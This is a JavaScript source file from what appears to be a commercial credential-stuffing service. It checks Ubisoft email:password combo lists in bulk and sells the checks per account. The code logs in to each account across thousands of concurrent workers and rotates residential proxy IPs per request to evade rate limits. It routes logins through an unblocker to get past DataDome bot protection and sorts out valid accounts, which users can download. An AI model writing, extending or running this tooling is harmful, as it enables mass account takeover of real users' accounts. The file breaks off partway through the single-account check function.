// Bulk account checker.
//
// One in-memory job registry tracks progress + a sliding window of recent
// finished lines for the live-feed UI. The results array itself isn't durable
// until job completion (encrypted + written then). DB-backed bulk_jobs row
// tracks total/done/charged_cents so a crash can't desync the user's balance
// from what they were billed.

const fs    = require('fs');
const path  = require('path');
const os    = require('os');
const { fork } = require('child_process');
const store = require('../store');
const { login, check2FA } = require('../auth');
// Run the extra webauth 2FA check on each valid account? On by default; set
// BULK_CHECK_2FA=0 to skip it (saves one gated call per valid account).
const CHECK_2FA = process.env.BULK_CHECK_2FA !== '0';
const { getPlayerData } = require('../player');
const fmt = require('./resultFormat');

const PRICE_PER_CHECK_USD = Number(process.env.PRICE_PER_CHECK_USD || 0.02);
const PRICE_CENTS = Math.round(PRICE_PER_CHECK_USD * 100);

// ── Volume pricing (server-proxy mode) ─────────────────────────────────────
// Measured proxy cost is ~0.002¢/check (only login traffic is proxied), so even
// 1¢ is a ~500× markup. These tiers are priced to cover server/compute + a
// little margin, NOT to maximize profit — cheaper the bigger the job, floored at
// the 1¢ minimum the integer-cent billing allows. Override with PRICING_TIERS
// (JSON array of {min, cents}). BYO-proxy mode bypasses per-check billing
// entirely (time-based subscription instead — see store.js subscriptions).
// Hardcoded (not derived from PRICE_PER_CHECK_USD) so a stale .env value can't
// inflate these on deploy. Override the whole table with PRICING_TIERS if needed.
const DEFAULT_TIERS = [
  { min: 1000, cents: 1 }, // 1k+ → $0.01 (the integer-cent floor)
  { min: 0,    cents: 2 }, // <1k → $0.02
];
function loadTiers() {
  try {
    const t = JSON.parse(process.env.PRICING_TIERS || '');
    if (Array.isArray(t) && t.length) return t.slice().sort((a, b) => b.min - a.min);
  } catch {}
  return DEFAULT_TIERS;
}
const PRICING_TIERS = loadTiers();
// Per-check price (cents) for a job of n accounts.
function priceForCount(n) {
  for (const t of PRICING_TIERS) if (n >= t.min) return t.cents;
  return PRICING_TIERS[PRICING_TIERS.length - 1].cents;
}

// ── Sub-cent MARGINAL pricing (server-proxy, billed UPFRONT per job) ─────────
// Per-check USD rate by MARGINAL bracket (like tax brackets): the first 10k
// checks cost the most, later checks get cheaper. This makes the job total
// strictly increasing with size, so splitting or padding a job can NEVER lower
// the price — that's the anti-exploit guarantee. Override with PRICING_BRACKETS
// (JSON [{upTo, usd}]). Whole job is charged up front; a min of 1¢ applies.
const DEFAULT_BRACKETS = [
  { upTo: 10000,   usd: 0.0002 },   // first 10k
  { upTo: 100000,  usd: 0.00005 },  // 10k–100k
  { upTo: 1000000, usd: 0.00003 },  // 100k–1M
  { upTo: Infinity, usd: 0.00002 }, // 1M+
];
function loadBrackets() {
  try { const b = JSON.parse(process.env.PRICING_BRACKETS || ''); if (Array.isArray(b) && b.length) return b.map(x => ({ upTo: x.upTo === null ? Infinity : x.upTo, usd: x.usd })); } catch {}
  return DEFAULT_BRACKETS;
}
const PRICING_BRACKETS = loadBrackets();
function jobCostUsd(n) {
  let cost = 0, prev = 0;
  for (const b of PRICING_BRACKETS) {
    if (n <= prev) break;
    cost += (Math.min(n, b.upTo) - prev) * b.usd;
    prev = b.upTo;
  }
  return cost;
}
// Whole-job cost in integer cents (rounded up), min 1¢ so tiny jobs aren't free.
function jobCostCents(n) { return n > 0 ? Math.max(1, Math.ceil(jobCostUsd(n) * 100)) : 0; }
// Public brackets for the UI (Infinity → null so it JSON-serializes).
const PRICING_BRACKETS_PUBLIC = PRICING_BRACKETS.map(b => ({ upTo: b.upTo === Infinity ? null : b.upTo, usd: b.usd }));

// Dynamic concurrency: more accounts in a job → more parallel workers, so big
// batches finish faster. Bounded by BULK_MAX_CONCURRENCY to stay within the
// proxy's thread allowance (this plan: ~2000), Ubisoft's anti-bot tolerance,
// and RAM. The proxy rotates per-request IPs so high concurrency is safe.
const BASE_CONCURRENCY = Math.max(1, Number(process.env.BULK_CONCURRENCY) || 8);
// Ceiling matches the proxy's thread allowance. DataImpulse plan = 2000 threads,
// so default the ceiling to 2000 (hard cap 2000). Each worker gets a fresh
// rotating residential IP, so high concurrency is safe. Override with
// BULK_MAX_CONCURRENCY (e.g. lower it if you switch to a smaller proxy plan).
const MAX_CONCURRENCY  = Math.max(BASE_CONCURRENCY, Math.min(8000, Number(process.env.BULK_MAX_CONCURRENCY) || 2000));
const CONCURRENCY = MAX_CONCURRENCY; // exported ceiling (UI/info)

// Tiered scaling by job size — ramp workers up with the batch so a big job runs
// at full throttle (up to the 2000-thread ceiling) while a 5-line test stays
// gentle. Bounded by MAX_CONCURRENCY and the job size.
function concurrencyFor(n) {
  let c;
  if      (n <= 20)     c = BASE_CONCURRENCY;     // tiny jobs: gentle
  else if (n <= 100)    c = 100;
  else if (n <= 1000)   c = 500;
  else if (n <= 10000)  c = 1500;
  else                  c = MAX_CONCURRENCY;       // 10k+: full throttle (2000+)
  return Math.max(1, Math.min(c, MAX_CONCURRENCY, n));
}
// Max accounts per bulk job. Default 1,000,000 — results stream to disk so
// large jobs don't buffer in RAM. Override with BULK_MAX_LINES.
const MAX_LINES = Math.max(1, Number(process.env.BULK_MAX_LINES) || 10_000_000);
// Owners share the same ceiling (default 10,000,000). Override OWNER_MAX_LINES.
const OWNER_MAX_LINES = Math.max(MAX_LINES, Number(process.env.OWNER_MAX_LINES) || 10_000_000);
// Per-user max: owners get the bigger cap.
function maxLinesFor(user) {
  try { if (require('../siteAuth').isOwner(user)) return OWNER_MAX_LINES; } catch {}
  return MAX_LINES;
}
// How many recent result lines to keep in memory for the live UI feed. Sized
// so the desktop feed (which polls a few times a second and de-dupes) doesn't
// "skip" accounts that age out between polls at high throughput.
const RECENT_WINDOW = Math.max(200, Number(process.env.BULK_RECENT_WINDOW) || 1500);

// Hard ceiling on a single account check. A login or API call that hangs (a
// dead proxy socket, a stalled subprocess) must NEVER freeze its worker — that
// was the cause of a 1M job stalling at ~13k. If a check exceeds this, we
// abandon it and treat it as a free network failure so the worker moves on.
// Hard per-account ceiling — used to be 120s but no real check ever takes that
// long; a stuck check just keeps a worker idle. 45s is well above p99 latency
// even on the slow path (login retry chain + full enrichment) and frees workers
// 3× faster when something genuinely hangs.
const CHECK_TIMEOUT_MS = Math.max(15_000, Number(process.env.BULK_CHECK_TIMEOUT_MS) || 45_000);
function withTimeout(promise, ms, label) {
  let t;
  const timeout = new Promise((_, rej) => { t = setTimeout(() => rej(new Error(label || 'check timeout')), ms); t.unref?.(); });
  return Promise.race([promise, timeout]).finally(() => clearTimeout(t));
}

// jobId → { results: string[], abort: { aborted: bool }, stoppedEarly?: 'insufficient_balance'|'cancelled' }
const registry = new Map();

const JOBS_DIR = path.join(process.env.CACHE_DIR || path.join(__dirname, '..', '..', '.cache'), 'jobs');
try { fs.mkdirSync(JOBS_DIR, { recursive: true }); } catch {}

// The ORIGINAL submitted input is persisted (encrypted) per job so we can later
// compute the "unchecked" accounts (input minus results) and "resume" a job
// without the user re-uploading the file.
function inputPath(jobId) { return path.join(JOBS_DIR, `${jobId}.input.enc`); }
function hasInput(jobId) { try { return fs.existsSync(inputPath(jobId)); } catch { return false; } }

// Accounts present in the input but NOT in the results = never checked.
// Returns { hadInput, accounts:[{email,password,raw}] }.
async function computeUnchecked(jobId) {
  if (!hasInput(jobId)) return { hadInput: false, accounts: [] };
  const checked = new Set();
  const job = store.getJob(jobId);
  if (job && job.results_path && fs.existsSync(job.results_path)) {
    try { for (const e of await fmt.collectEmails(job.results_path)) checked.add(e); } catch (e) { console.warn('[bulk] collectEmails failed:', e.message); }
  }
  let text = '';
  try { text = fmt.decryptFromFile(inputPath(jobId)); } catch (e) { return { hadInput: false, accounts: [] }; }
  const all = parseAccounts(text, Number.MAX_SAFE_INTEGER);
  const accounts = all.filter(a => !checked.has(a.email.toLowerCase()));
  return { hadInput: true, accounts };
}

// Periodically remove orphaned input files (job row gone or expired).
function sweepInputs() {
  try {
    for (const f of fs.readdirSync(JOBS_DIR)) {
      if (!f.endsWith('.input.enc')) continue;
      const jobId = f.slice(0, -'.input.enc'.length);
      const job = store.getJob(jobId);
      if (!job || (job.expires_at && job.expires_at < Date.now())) {
        try { fs.unlinkSync(path.join(JOBS_DIR, f)); } catch {}
      }
    }
  } catch {}
}
setInterval(sweepInputs, 60 * 60 * 1000).unref();

// On boot, salvage orphaned plaintext temp files (left if the process died
// mid-job — e.g. OOM / restart during a 1M-account run). Rather than throwing
// away everything checked so far (which loses every valid hit), we encrypt the
// partial results into the job's .enc and mark the job done so the user can
// still download their valids. Only if a salvage fails do we delete the temp
// file (it holds cleartext passwords, so it must never linger).
try {
  for (const f of fs.readdirSync(JOBS_DIR)) {
    if (!f.endsWith('.txt.tmp')) continue;
    const tmpPath = path.join(JOBS_DIR, f);
    const jobId   = f.slice(0, -'.txt.tmp'.length);
    const encPath = path.join(JOBS_DIR, `${jobId}.enc`);
    (async () => {
      try {
        // Skip if the job already has a finished .enc (nothing to salvage).
        if (fs.existsSync(encPath)) { fs.unlinkSync(tmpPath); return; }
        if (fs.statSync(tmpPath).size > 0) {
          await fmt.encryptFileStream(tmpPath, encPath);
          try { store.finishJob(jobId, encPath); } catch {}
          console.log(`[bulk] salvaged partial results for interrupted job ${jobId}`);
        }
      } catch (e) {
        console.warn(`[bulk] salvage of ${jobId} failed: ${e.message}`);
      } finally {
        // Always remove the cleartext temp file once we're done with it.
        try { fs.unlinkSync(tmpPath); } catch {}
      }
    })();
  }
} catch {}

// ── Input parsing ────────────────────────────────────────────────────────
// Accepts an array of strings or one big "\n"-joined string. Returns deduped
// [{ email, password, raw }, ...]. Skips blank lines, '#' comments, and any
// line that doesn't contain a ':'.
function parseAccounts(input, maxLines = MAX_LINES) {
  const lines = Array.isArray(input) ? input : String(input || '').split(/\r?\n/);
  const seen = new Set();
  const out = [];
  for (const raw of lines) {
    const line = String(raw).trim();
    if (!line || line.startsWith('#')) continue;
    const colon = line.indexOf(':');
    if (colon < 1 || colon === line.length - 1) continue;
    const email = line.slice(0, colon).trim();
    const password = line.slice(colon + 1);
    if (!email || !password) continue;
    const key = email.toLowerCase();
    if (seen.has(key)) continue;
    seen.add(key);
    out.push({ email, password, raw: `${email}:${password}` });
    // Don't silently truncate — allow one over so startJob can detect overflow
    // and return a proper 400 to the user instead of pretending only 500 lines
    // existed.
    if (out.length > maxLines) break;
  }
  return out;
}

// ── Start a new job ──────────────────────────────────────────────────────
// Throws on validation / balance errors. Returns the job row on success and
// kicks off the runner in the background.
function startJob(userId, accounts, opts = {}) {
  if (!Array.isArray(accounts) || accounts.length === 0) {
    const e = new Error('No valid email:password lines found.'); e.status = 400; throw e;
  }
  const user = store.getUserById(userId);
  if (!user) { const e = new Error('User not found.'); e.status = 404; throw e; }
  const limit = maxLinesFor(user);
  if (accounts.length > limit) {
    const e = new Error(`Maximum ${limit.toLocaleString('en-US')} accounts per job.`); e.status = 400; throw e;
  }
  let owner = false;
  try { owner = require('../siteAuth').isOwner(user); } catch {}
  // ── BYO-proxy mode: free checks through the user's own proxies. Requires an
  // active access pass — UNLESS the user is an owner or flagged unlimited.
  //
  // SPEED: raw residential (DataImpulse) gets DataDome-challenged on nearly every
  // login → ~5 retries each → ~40 real logins/s. The server's IPRoyal Web
  // Unblocker auto-bypasses DataDome → 1 request/login, several× faster. So for
  // owner/unlimited we STACK the unblocker WITH their proxies (round-robin), and
  // can fall back to unblocker-only. Toggle: BULK_OWNER_UNBLOCKER = stack | only | off.
  const UNBLOCKER_MODE = (process.env.BULK_OWNER_UNBLOCKER || 'stack').toLowerCase();
  let byoProxies = null;
  if (opts.byoProxy) {
    const privileged = owner || user.unlimited;
    if (!privileged && !store.isSubscriptionActive(userId)) {
      const e = new Error('No active BYO-proxy access pass. Buy one (daily/weekly/monthly) to run checks with your own proxies.');
      e.status = 402; throw e;
    }
    const own = store.getUserProxies(userId).map(toProxyUrl).filter(Boolean);
    if (privileged && UNBLOCKER_MODE === 'only') {
      byoProxies = null;                 // unblocker only (proxyUrl=null → shared unblocker)
    } else if (privileged && UNBLOCKER_MODE !== 'off') {
      // Stack: null (= unblocker) round-robined alongside the user's proxies, so
      // the fast lane carries most of the load and their proxy adds on top.
      byoProxies = [null, ...own];
    } else {
      byoProxies = own;
      if (!byoProxies.length) {
        const e = new Error('Add at least one proxy first (Import/Save proxies).');
        e.status = 400; throw e;
      }
    }
  } else {
    // ── Server Proxies mode: force IP rotation via the env-configured proxy ──
    // Without this, login was routed through proxyClient.proxiedRequest which
    // uses the raw base URL — NO per-request session token, so every request
    // exited a narrow band of IPs. Ubi rate-limits by (fingerprint × IP), so a
    // narrow IP pool triggered a sustained 429 storm even with 32 fingerprints
    // cycling. By setting byoProxies to the ONE base URL, the login path
    // (attempt loop → freshProxy(url) → -session-<rand> per request) kicks in
    // and every login exits a distinct exit IP. This is the same rotation BYO
    // mode gets — no reason server mode should have been running without it.
    // Falls back to null (unchanged behavior) if the env proxy is misconfigured.
    try {
      const { proxyUrl: buildProxyUrl, isProxyEnabled } = require('../proxyClient');
      if (isProxyEnabled()) {
        const url = buildProxyUrl();
        if (url) byoProxies = [url];
      }
    } catch (e) { console.warn('[bulk] server-proxy rotation setup failed:', e.message); }
  }
  const freeUser = !!user.unlimited || owner || !!opts.byoProxy;
  // Server-proxy jobs are charged UP FRONT for the whole job (marginal pricing).
  // freeUser (owner / unlimited / BYO) pays nothing.
  const jobCost = freeUser ? 0 : jobCostCents(accounts.length);
  if (jobCost > 0 && user.balance_cents < jobCost) {
    const e = new Error('Insufficient balance.');
    e.status = 402;
    e.needed_cents = jobCost;
    e.have_cents = user.balance_cents;
    throw e;
  }
  const job = store.createJob(userId, accounts.length);
  // Charge the whole job now. The worker then runs "unlimited" (no per-check
  // billing); we refund the unchecked remainder if the job is stopped early.
  if (jobCost > 0) {
    try { store.chargeUser(userId, jobCost, job.id, `bulk:${accounts.length}`); }
    catch (e) {
      if (e instanceof store.InsufficientFundsError) { const err = new Error('Insufficient balance.'); err.status = 402; err.needed_cents = jobCost; err.have_cents = user.balance_cents; throw err; }
      throw e;
    }
  }
  const unlimited = true; // billing is handled up front above
  // Persist the original input (encrypted) so we can later compute the
  // "unchecked" set and resume the job without a re-upload. Best-effort.
  try { fmt.encryptToFile(inputPath(job.id), accounts.map(a => a.raw).join('\n')); }
  catch (e) { console.warn('[bulk] input persist failed:', e.message); }
  // Stream results to a plaintext temp file as we go — never buffer 1M lines
  // in memory. recent[] holds only the last RECENT_WINDOW lines for the UI.
  const tmpPath = path.join(JOBS_DIR, `${job.id}.txt.tmp`);
  const stream = fs.createWriteStream(tmpPath, { flags: 'a' });
  // One active job per user — supersede any of their still-running jobs so a new
  // Start never stacks 2× the worker load on the shared event loop (the cause of
  // the whole site crawling). The old job finalizes whatever it checked.
  for (const [jid, r] of registry) {
    if (r && r.userId === userId && !r.finalized && jid !== job.id) {
      console.log(`[bulk] superseding user ${userId}'s previous job ${jid}`);
      try { cancelJob(jid); } catch {}
    }
  }
  registry.set(job.id, { recent: [], recentValid: [], counts: { valid: 0, vwi: 0, twofa: 0, banned: 0, invalid: 0, retry: 0, err: 0 }, abort: { aborted: false }, stream, tmpPath, unlimited, jobCost, total: accounts.length, refunded: false, userId, proxies: byoProxies });
  // Fire and forget. Errors logged inside runJob.
  runJob(job.id, userId, accounts).catch(err => console.error(`[bulk] job ${job.id} crashed:`, err));
  return job;
}

// ── Run one job ──────────────────────────────────────────────────────────
async function runJob(jobId, userId, accounts) {
  const reg = registry.get(jobId);
  if (!reg) return;
  // Shared cursor instead of queue.shift(): shift() on a 1M-element array is
  // O(n) per call → O(n²) total, which grinds large jobs to a near-halt. An
  // atomic index increment is O(1) and Node's single-threaded event loop makes
  // `cursor++` safe across workers (no lock needed).
  let cursor = 0;
  const total = accounts.length;

  // Never-skip slow lane: transient (network/retry) outcomes are NON-definitive.
  // The fast lane retries NET_RETRIES times on fresh proxies; if STILL transient,
  // the account is DEFERRED (not recorded as ERROR) and retried later in rounds
  // by drainSlowLane, so a momentary block resolves to a real answer instead of
  // a dropped ERROR line.
  const NET_RETRIES = Math.max(0, Number(process.env.BULK_NETWORK_RETRIES) || 3);
  const SLOW_ROUNDS = Math.max(0, Number(process.env.BULK_SLOW_RETRIES) || 8);
  const SLOW_MS = Math.max(1000, Number(process.env.BULK_SLOW_MS) || 30_000);
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const deferred = [];   // transient failures handed to the slow lane

  // Fast-lane attempt: up to NET_RETRIES+1 tries on rotating proxies/IPs.
  async function attempt(acc, idxSeed) {
    let outcome, playerData;
    for (let a = 0; a <= NET_RETRIES; a++) {
      const proxyUrl = (reg.proxies && reg.proxies.length)
        ? reg.proxies[(idxSeed + a) % reg.proxies.length] : null;
      try {
        const r = await withTimeout(checkOne(acc.email, acc.password, proxyUrl), CHECK_TIMEOUT_MS, 'check timeout');
        outcome = r.outcome; playerData = r.playerData;
      } catch (e) {
        if (e && e.message === 'check timeout') console.warn(`[bulk] check timed out for ${acc.email} after ${CHECK_TIMEOUT_MS}ms`);
        else console.error(`[bulk] worker error on ${acc.email}: ${e.message}`);
        outcome = 'network';
      }
      if (outcome !== 'network' && outcome !== 'retry') break;
      if (a < NET_RETRIES && !reg.abort.aborted && !reg.finalized) await sleep(400 + a * 600);
    }
    return { outcome, playerData };
  }

  // Record a DEFINITIVE outcome: bill (if billable + not unlimited), stream the
  // line, update the live feed + counters, bump the done counter.
  function record(acc, outcome, playerData) {
    if (reg.abort.aborted || reg.finalized) return;
    if (fmt.isBillable(outcome) && !reg.unlimited) {
      try {
        store.chargeUser(userId, reg.priceCents, jobId, acc.email);
      } catch (e) {
        if (e instanceof store.InsufficientFundsError) {
          reg.abort.aborted = true; reg.stoppedEarly = 'insufficient_balance'; return;
        }
        throw e;
      }
    }
    const line = fmt.formatLine(acc.email, acc.password, outcome, playerData);
    try { reg.stream.write(line + '\n'); } catch { return; }
    reg.recent.push(line);
    if (reg.recent.length > RECENT_WINDOW) reg.recent.shift();
    const st = fmt.feedStatus(line);
    if (reg.counts[st] != null) reg.counts[st]++;
    if (st === 'valid' || st === 'vwi' || st === 'banned' || st === 'twofa') {
      reg.recentValid.push(line);
      if (reg.recentValid.length > RECENT_WINDOW) reg.recentValid.shift();
    }
    store.bumpJobDone(jobId);
  }

  // Adaptive rate governor: acquire a slot before each attempt, release after.
  // When Ubi rate-limits us, the governor cuts concurrency (AIMD) and — if the
  // 429 rate crosses the threshold — opens a circuit breaker that pauses all
  // workers for the pause window. Prevents the "stuck at 0" storm state.
  const { gov } = require('./rateGovernorInstance');

  async function worker() {
    while (cursor < total && !reg.abort.aborted) {
      await gov.acquire();
      try {
        if (reg.abort.aborted) return;
        const idx = cursor++;
        if (idx >= total) return;
        const acc = accounts[idx];
        const r = await attempt(acc, idx);
        if (reg.abort.aborted || reg.finalized) continue;
        if (r.outcome === 'network' || r.outcome === 'retry') deferred.push({ acc, idx });
        else record(acc, r.outcome, r.playerData);
      } finally {
        gov.release();
      }
    }
  }

  // ── Multi-process runner (opt-in via BULK_WORKERS) ──────────────────────
  // Forks N child Node processes (one per requested worker), each with its
  // own libuv pool + event loop running an in-process concurrency pool. Each
  // child's results flow back over IPC and pass through the SAME billing /
  // disk / counter / DB pipeline as the legacy in-process worker. Toggle:
  //   BULK_WORKERS=4 BULK_WORKER_CONCURRENCY=125    (4 cores × 125 in-flight)
  // Disabled (=1, the default) keeps the legacy in-process path bit-for-bit.
  async function runWithChildren(N) {
    const childScript = path.join(__dirname, 'bulkWorker.js');
    // Round-robin split so every child finishes roughly together — even if the
    // input is sorted (by domain / quality / TLD) one chunk doesn't lag the others.
    const chunks = Array.from({ length: N }, () => []);
    for (let i = 0; i < total; i++) chunks[i % N].push(accounts[i]);
    console.log(`[bulk] job ${jobId}: ${N} child processes (chunks: ${chunks.map(c => c.length).join('/')})`);

    // Size each child's rate governor so the N children SUM to the configured
    // ceiling (MAX_CONCURRENCY) instead of each child independently running to
    // it (which would be N× the intended load). Coroutine count per child = its
    // governed max, so the governor is the binding limit; it slow-starts from a
    // per-child share of the initial and adapts per child on 429.
    const perChildMax  = Math.max(1, Math.ceil(MAX_CONCURRENCY / N));
    const perChildInit = Math.max(8, Math.min(perChildMax, Math.ceil((Number(process.env.BULK_GOV_INITIAL_CONCURRENCY) || 128) / N)));
    const childEnv = {
      ...process.env,
      BULK_GOV_MAX_CONCURRENCY:     String(perChildMax),
      BULK_GOV_INITIAL_CONCURRENCY: String(perChildInit),
      BULK_WORKER_CONCURRENCY:      String(perChildMax),
    };
    console.log(`[bulk] job ${jobId}: per-child governor init=${perChildInit} max=${perChildMax} (N=${N} → ~${perChildMax * N} total ceiling)`);
    const children = chunks.map(() => fork(childScript, [], { env: childEnv }));
    let livingChildren = children.length;

    // Identical to the in-process worker's post-check pipeline. Kept inline so
    // any future change there is a single edit, not two.
    function handleResult(payload) {
      if (reg.abort.aborted || reg.finalized) return;
      const { email, outcome, line } = payload;
      if (fmt.isBillable(outcome) && !reg.unlimited) {
        try { store.chargeUser(userId, reg.priceCents, jobId, email); }
        catch (e) {
          if (e instanceof store.InsufficientFundsError) {
            reg.abort.aborted = true;
            reg.stoppedEarly = 'insufficient_balance';
            children.forEach(c => { try { c.send({ type: 'abort' }); } catch {} });
            return;
          }
          throw e;
        }
      }
      try { reg.stream.write(line + '\n'); } catch { return; }
      reg.recent.push(line);
      if (reg.recent.length > RECENT_WINDOW) reg.recent.shift();
      const st = fmt.feedStatus(line);
      if (reg.counts[st] != null) reg.counts[st]++;
      if (st === 'valid' || st === 'vwi' || st === 'banned' || st === 'twofa') {
        reg.recentValid.push(line);
        if (reg.recentValid.length > RECENT_WINDOW) reg.recentValid.shift();
      }
      store.bumpJobDone(jobId);
    }

    return new Promise((resolve) => {
      const childDone = (idx) => () => {
        if (children[idx]._done) return; children[idx]._done = true;
        livingChildren--;
        try { children[idx].disconnect(); } catch {}
        if (livingChildren <= 0) { clearInterval(abortInterval); resolve(); }
      };
      let abortSince = 0;
      const abortInterval = setInterval(() => {
        if (reg.abort.aborted || reg.finalized) {
          if (!abortSince) abortSince = Date.now();
          children.forEach(c => { try { c.send({ type: 'abort' }); } catch {} });
          // A governor-gated child can be parked behind an open circuit breaker
          // when a cancel lands, so the cooperative abort flag alone might not
          // free it until the pause elapses. After a short grace, force the exit
          // by disconnecting — the child's 'disconnect' handler calls
          // process.exit. Results were already snapshot-finalized on cancel, so
          // there's nothing left to collect.
          if (Date.now() - abortSince > 2500) {
            children.forEach(c => { try { c.disconnect(); } catch {} });
          }
        }
      }, 1000);
      children.forEach((c, idx) => {
        c.on('message', (msg) => {
          if (!msg || typeof msg !== 'object') return;
          if (msg.type === 'result') handleResult(msg);
          else if (msg.type === 'done') childDone(idx)();
          else if (msg.type === 'fatal') console.error(`[bulk] child ${idx} fatal:`, msg.error);
        });
        c.on('exit', childDone(idx));
        c.on('error', (e) => console.error(`[bulk] child ${idx} error:`, e.message));
        try { c.send({ type: 'init', accounts: chunks[idx], proxies: reg.proxies || null }); }
        catch (e) { console.error(`[bulk] child ${idx} init failed:`, e.message); childDone(idx)(); }
      });
    });
  }

  const N_WORKERS = Math.max(1, Math.min(os.cpus().length, Number(process.env.BULK_WORKERS) || 1));
  // Multi-process is only worth the fork overhead on a big batch — small jobs
  // stay on the in-process path (faster startup, no IPC overhead).
  const useChildren = N_WORKERS > 1 && accounts.length >= N_WORKERS * 100;
  const workerCount = concurrencyFor(accounts.length);
  console.log(`[bulk] job ${jobId}: ${accounts.length} accounts, ${useChildren ? `${N_WORKERS} child processes` : `${workerCount} in-process workers`}`);
  try {
    if (useChildren) {
      await runWithChildren(N_WORKERS);
    } else {
      await Promise.all(Array.from({ length: workerCount }, () => worker()));
      // Never-skip: drain transient failures through the bounded slow lane so
      // every line resolves to a real answer (or a terminal ERROR only after the
      // budget is spent) instead of being dropped on the first network blip.
      if (deferred.length && !reg.abort.aborted && !reg.finalized) {
        console.log(`[bulk] job ${jobId}: slow lane — ${deferred.length} transient account(s) deferred for retry`);
        const { drainSlowLane } = require('./neverSkip');
        const res = await drainSlowLane(deferred, {
          attempt: (item, round) => attempt(item.acc, item.idx + round * 7),
          record: (item, outcome, pd) => record(item.acc, outcome, pd),
          sleep, concurrency: workerCount,
          aborted: () => reg.abort.aborted || reg.finalized,
          acquire: () => gov.acquire(), release: () => gov.release(),
        }, { rounds: SLOW_ROUNDS, delayMs: SLOW_MS });
        // Survivors are left UNRECORDED (no error lines) → they fall into the
        // job's "unchecked" set and can be resumed later.
        if (res.unresolved) console.log(`[bulk] job ${jobId}: ${res.unresolved} account(s) left unchecked after slow lane (resumable — no error written)`);
      }
    }
  } catch (e) {
    // Any unexpected throw from a worker shouldn't leave the job stuck in
    // 'running' forever — log and continue to finalize what we have.
    console.error(`[bulk] job ${jobId} worker error:`, e.message);
  } finally {
    // GUARANTEE: no matter how the run ends — normal completion, a thrown
    // worker error, or cancellation — whatever was checked so far is encrypted
    // and made downloadable. finalize is idempotent.
    await finalize(jobId).catch(err =>
      console.error(`[bulk] finalize ${jobId} threw:`, err && err.message));
  }
}

// ── Cancel a job ─────────────────────────────────────────────────────────
function cancelJob(jobId) {
  const reg = registry.get(jobId);
  if (!reg) return false;
  reg.abort.aborted = true;
  reg.stoppedEarly = reg.stoppedEarly || 'cancelled';
  // Snapshot-finalize NOW so whatever was collected (incl. any valid hits)
  // is encrypted + downloadable immediately, without waiting for in-flight
  // checks to drain. finalize is idempotent; runJob's later call is a no-op.
  finalize(jobId).catch(() => {});
  return true;
}

// ── Finalize: stream-encrypt results to disk, mark job done ─────────────
async function finalize(jobId) {
  const reg = registry.get(jobId);
  if (!reg || reg.finalized) return;
  reg.finalized = true; // set synchronously so in-flight workers stop writing
  // Refund the unchecked remainder of an up-front-charged job (e.g. stopped
  // early). Fair marginal cost of what was actually checked = jobCostCents(done).
  if (reg.jobCost > 0 && !reg.refunded) {
    reg.refunded = true;
    try {
      const done = (store.getJob(jobId) || {}).done || 0;
      const owed = jobCostCents(done);
      const refund = Math.max(0, reg.jobCost - owed);
      if (refund > 0) {
        store.creditBalance(reg.userId, refund, 'refund', jobId, { reason: 'bulk-unchecked', checked: done, total: reg.total });
        console.log(`[bulk] refunded ${refund}¢ to user ${reg.userId} (job ${jobId}: ${done}/${reg.total} checked)`);
      }
    } catch (e) { console.warn('[bulk] refund failed:', e.message); }
  }
  const filePath = path.join(JOBS_DIR, `${jobId}.enc`);
  let saved = false;        // did we successfully persist a downloadable .enc?
  let hadResults = false;   // was there any data to save at all?
  try {
    // Flush + close the plaintext temp stream first.
    await new Promise((resolve) => reg.stream.end(resolve));
    hadResults = fs.existsSync(reg.tmpPath) && fs.statSync(reg.tmpPath).size > 0;
    if (hadResults) {
      // Stream-encrypt temp → .enc with constant memory (handles 1M lines).
      // Retry once on failure (transient disk/IO hiccup) before giving up.
      let lastErr;
      for (let attempt = 1; attempt <= 2 && !saved; attempt++) {
        try {
          await fmt.encryptFileStream(reg.tmpPath, filePath);
          store.finishJob(jobId, filePath);
          saved = true;
        } catch (e) {
          lastErr = e;
          console.error(`[bulk] finalize ${jobId} encrypt attempt ${attempt} failed:`, e.message);
          // Drop the (possibly partial/corrupt) .enc before retrying.
          try { fs.unlinkSync(filePath); } catch {}
        }
      }
      if (!saved) throw lastErr || new Error('encrypt failed');
    } else {
      // No results (empty job) — still mark done.
      store.finishJob(jobId, null);
    }
  } catch (e) {
    console.error(`[bulk] finalize ${jobId} failed:`, e && e.message);
    // Couldn't encrypt despite having data: do NOT mark the job done with a
    // null path (that would throw the results away). Leave the job as-is so
    // the boot salvage retries the encryption next start — the raw temp file
    // is preserved below for exactly that reason.
    if (!hadResults) store.finishJob(jobId, null);
  } finally {
    // Remove the plaintext temp file (cleartext passwords) only once its data
    // is safely encrypted to .enc — or there was nothing to save. If the save
    // failed, KEEP the temp so boot salvage can recover the hits later.
    if (saved || !hadResults) {
      try { if (reg.tmpPath) fs.unlinkSync(reg.tmpPath); } catch {}
    }
    // Keep registry around for ~60s after finish so the UI can still poll.
    setTimeout(() => registry.delete(jobId), 60_000).unref();
  }
}

// Normalise a user-supplied proxy line into an http proxy URL. Accepts:
//   host:port | host:port:user:pass | user:pass@host:port | http(s)://...
function toProxyUrl(line) {
  if (!line) return null;
  let s = String(line).trim();
  if (!s) return null;
  if (/^https?:\/\//i.test(s) || /^socks/i.test(s)) return s;
  if (s.includes('@')) return `http://${s}`;
  const p = s.split(':');
  if (p.length === 2) return `http://${p[0]}:${p[1]}`;
  if (p.length === 4) return `http://${p[2]}:${p[3]}@${p[0]}:${p[1]}`; // host:port:user:pass
  return `http://${s}`;
}

// ── Single account check ────────────────────────────────────────────────
// Wraps login() + getPlayerData() and maps the result to an outcome tag.
// proxyUrl (optional) routes the DataDome-gated login/token calls through a
// specific proxy (BYO-proxy bulk mode).
// A syntactically-impossible email (combo-list garbage: two @-signs, no domain
// dot, spaces, etc.) can never be a real Ubisoft account. Mark it invalid
// instantly instead of burning a proxy request to have Ubisoft 401 it anyway.
// Conservative: only rejects clear garbage, never a deliverable address.
function isPlausibleEmail(e) {
  return typeof e === 'string' && e.length <= 254 && /^[^@\s]+@[^@\s.]+(\.[^@\s.]+)+$/.test(e);
}

async function checkOne(email, password, proxyUrl) {
  if (!isPlausibleEmail(email)) return { outcome: 'invalid' };
  let session;
  try {
    session = await login(email, password, proxyUrl ? { proxyUrl } : {});
  } catch (loginError) {
    return { outcome: fmt.decideOutcome({ loginError }) };
  }
  // Fire-and-forget session teardown after we're done with this account. Ubi
  // keeps a per-source active-ticket quota — leaking tickets across 600 workers
  // was almost certainly a driver of the sustained 401/429 storms. Toggle via
  // BULK_UBI_LOGOUT=0. The DELETE is issued through the same proxyUrl so the
  // source-IP path matches the login. See lib/auth.js:logout for details.
